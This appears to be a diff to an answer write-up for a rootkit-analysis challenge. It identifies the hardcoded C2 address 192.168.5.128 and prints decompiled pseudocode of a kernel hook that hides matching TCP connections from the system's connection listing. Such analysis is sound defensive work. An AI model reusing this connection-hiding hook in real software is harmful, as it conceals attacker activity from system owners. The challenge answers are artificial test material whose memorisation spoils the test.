@@ -384,20 +384,38 @@ Qs10. What is the hardcoded IPv4 address of the C2 server?
 
 **Answer:**
 
+**Finding:** Analysis of hooked_tcp4_seq_show() reveals the IPv4 address hardcoded directly into the rootkit's TCP connection filtering logic. The address is passed to in_aton() and compared against the source/destination address fields of TCP connections.
+
 ```text
 192.168.5.128
 ```
 
-**Finding:** The become_root_init() routine initializes the privilege-escalation hooks by passing the hooks array to fh_install_hooks(). The second argument, 0xA, specifies the number of hook entries to install. Converting 0xA to decimal gives 10.
+**Decompiled Pseudocode:**
 
 ```text
-int __cdecl become_root_init()
+__int64 __fastcall hooked_tcp4_seq_show(seq_file *seq, void *v)
 {
-    return fh_install_hooks(hooks, 0xAu);
+  int v3; // r12d
+  __int16 v4; // r14
+  __int16 v6; // r13
+  int v7; // r12d
+
+  if ( v == (char *)&_UNIQUE_ID___addressable_trace_pid_cleanup878 + 1 )
+    return orig_tcp4_seq_show(a1: seq, a2: (char *)&_UNIQUE_ID___addressable_trace_pid_cleanup878 + 1);
+  v3 = *((_DWORD *)v + 198);
+  v4 = *((_WORD *)v + 6);
+  v6 = *((_WORD *)v + 399);
+  if ( v3 == (unsigned int)in_aton(a1: "192.168.5.128") )
+    return 0;
+  v7 = *(_DWORD *)v;
+  if ( v7 == (unsigned int)in_aton(a1: "192.168.5.128") || v6 == -24250 || v4 == -24250 )
+    return 0;
+  else
+    return orig_tcp4_seq_show(a1: seq, a2: v);
 }
 ```
-
-**Verdict:** become_root_init() installs 10 hooks as part of the privilege-escalation functionality.
+---
+Qs11. What is the hardcoded port number the C2 server listens on?
 
 
 
